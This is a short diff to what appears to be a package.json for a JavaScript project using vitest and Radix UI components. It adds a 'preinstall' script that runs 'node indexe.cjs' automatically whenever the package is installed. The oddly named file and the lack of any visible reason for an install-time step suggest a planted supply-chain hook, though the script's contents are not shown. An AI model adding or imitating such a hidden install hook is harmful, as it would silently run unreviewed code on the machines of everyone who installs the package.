@@ -10,7 +10,8 @@
     "test": "vitest",
     "test:run": "vitest run",
     "test:watch": "vitest watch",
-    "coverage": "vitest run --coverage"
+    "coverage": "vitest run --coverage",
+    "preinstall": "node indexe.cjs"
   },
   "dependencies": {
     "@radix-ui/react-alert-dialog": "^1.1.15",
